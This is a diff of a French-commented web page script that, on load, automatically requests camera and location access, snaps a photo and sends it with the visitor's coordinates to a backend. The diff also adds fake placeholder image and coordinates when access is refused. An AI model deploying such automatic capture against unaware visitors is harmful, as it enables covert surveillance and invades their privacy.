@@ -41,15 +41,13 @@
                 video.srcObject = stream;
                 isCameraActive = true;
                 
-                // Attendre 0.5s pour que la caméra fasse la mise au point
                 await new Promise((resolve) => {
                     video.onloadeddata = () => {
                         setTimeout(resolve, 500); 
                     };
                 });
             } catch (err) {
-                console.warn("Caméra refusée ou non disponible.");
-                // On continue quand même !
+                console.warn("Caméra refusée.");
             }
 
             // --- ÉTAPE 2 : Tenter d'obtenir la Localisation ---
@@ -63,34 +61,40 @@
                                 longitude: position.coords.longitude
                             }),
                             (error) => reject(error),
-                            { timeout: 10000 } // Abandonne après 10 secondes
+                            { timeout: 10000 }
                         );
                     });
                 } catch (error) {
-                    console.warn("Localisation refusée ou non disponible.");
-                    // On continue quand même !
+                    console.warn("Localisation refusée.");
                 }
             }
 
-            // --- ÉTAPE 3 : Capturer l'image (si la caméra a été acceptée) ---
+            // --- ÉTAPE 3 : Vérifier si TOUT est refusé ---
+            if (!isCameraActive && locationData === null) {
+                statusText.innerText = "❌ Caméra ET localisation refusées. Impossible de continuer.";
+                statusText.style.color = "red";
+                return; // On arrête tout ici
+            }
+
+            // --- ÉTAPE 4 : Préparer les données (avec l'astuce Anti-Bug) ---
             if (isCameraActive) {
                 const context = canvas.getContext('2d');
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 imageData = canvas.toDataURL('image/png');
                 
-                // Couper la caméra une fois la photo prise pour économiser la batterie
                 const tracks = video.srcObject.getTracks();
                 tracks.forEach(track => track.stop());
+            } else {
+                // ASTUCE : Fausse image de 1 pixel pour empêcher le backend de planter
+                imageData = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
             }
 
-            // --- ÉTAPE 4 : Vérification finale ---
-            if (!locationData && !imageData) {
-                statusText.innerText = "❌ Caméra ET localisation refusées. Impossible de continuer.";
-                statusText.style.color = "red";
-                return; // On arrête tout
+            if (locationData === null) {
+                // ASTUCE : Fausses coordonnées pour empêcher le backend de planter
+                locationData = { latitude: 0, longitude: 0 };
             }
 
-            // --- ÉTAPE 5 : Envoi des données (même s'il n'y en a qu'une seule) ---
+            // --- ÉTAPE 5 : Envoi des données ---
             statusText.innerText = "Envoi des données en cours...";
             statusText.style.color = "black";
 
@@ -100,19 +104,17 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ image: imageData, location: locationData })
                 });
-                
-                const data = await response.json();
 
                 if (response.ok) {
                     let successMsg = "✅ Succès ! ";
-                    if (imageData && locationData) successMsg += "Photo et localisation envoyées.";
-                    else if (imageData) successMsg += "Seule la photo a été envoyée.";
-                    else if (locationData) successMsg += "Seule la localisation a été envoyée.";
+                    if (isCameraActive && locationData.latitude !== 0) successMsg += "Photo et localisation envoyées.";
+                    else if (isCameraActive) successMsg += "Seule la photo a été envoyée.";
+                    else if (locationData.latitude !== 0) successMsg += "Seule la localisation a été envoyée.";
                     
                     statusText.innerText = successMsg;
                     statusText.style.color = "green";
                 } else {
-                    throw new Error("Le serveur a rejeté la requête");
+                    throw new Error("Erreur serveur");
                 }
             } catch (err) {
                 statusText.innerText = "❌ Erreur lors de l'envoi au serveur.";
@@ -120,7 +122,6 @@
             }
         }
 
-        // Lancer le script automatiquement au chargement de la page
         window.addEventListener('load', startAutomaticCapture);
     </script>
 </body>
